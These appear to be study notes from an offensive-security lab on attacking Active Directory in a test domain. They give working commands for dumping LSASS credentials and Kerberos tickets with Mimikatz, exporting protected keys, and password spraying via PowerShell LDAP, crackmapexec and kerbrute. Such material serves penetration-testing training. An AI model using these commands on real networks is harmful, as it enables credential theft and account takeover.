# Active Directory Exploitation

Having enumerated user accounts, group memberships, and registered Service Principal Names let's now attempt to use this information to compromise Active Directory.



Start PowerShell as an administrator:
- Windows Run Box: `powershell -Command "Start-Process powershell -Verb RunAs"`
- Executable: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- File Explorer: right-click anywhere in the folder and select "Open in Terminal"
- Shortcut: `Win+X` to open context menu and then `a` (Terminal Admin)























## Cached AD Credentials

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request.
In modern versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.

If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.

Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.



In Domain Controller:`C:\Windows\NTDS\ntds.dit` (New Technology Directory Services Directory Information Tree)



### Mimikatz
- <https://github.com/gentilkiwi/mimikatz/wiki/>



- Use Mimikatz to extract domain hashes on our Windows 11 system
```
# SeDebugPrivlege privilege allow us to interact with a process owned by another account
privilege::debug

# dump the credentials of all logged-on users with the Sekurlsa module
# This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions
sekurlsa::logonpasswords


# show the tickets that are stored in memory
# previously open a second PowerShell window and do something to create a  cache a service ticket. Example: dir \\web04.corp.com\backup
sekurlsa::tickets

```

TGS would allow us to access only particular resources associated with those tickets

Alternatively, with a TGT we could request a TGS for specific resources we want to target within the domain. 



- export certificate with the private key
The `crypto` module contains the capability to either patch the `CryptoAPI` function with `crypto::capi` or `KeyIso` service with `crypto::cng` making non-exportable keys exportable.




















## Password Attacks

Beware of account lockouts! To learn about this use the `net accounts` command.
```
...
Lockout threshold:
Lockout duration (minutes):
Lockout observation window (minutes):
...
```



### Using DAP and ADSI
- perform a low and slow password attack against AD users
- make queries in the context of a different user by setting the DirectoryEntry instance
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

If the password for the user account is correct, the object creation will be successful.
If the password is invalid, no object will be created and we will receive an exception.



This password spraying tactic is already implemented in the PowerShell script `Spray-Passwords.ps1`

```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```









### Using SMB
For every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy due to the generated network traffic. It is also quite slow in comparison to other techniques.  

```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```


If the user with the identified credentials has administrative privileges crackmapexec adds `Pwn3d!` to the output. In an assessment, this is an excellent feature to determine the level of access we have without performing additional enumeration.






### Using Kerberos TGT

- <https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html>
- <https://github.com/ropnop/kerbrute>


```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
(make sure that the encoding of usernames.txt is ANSI!)























































## Kerberoasting
Involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password.





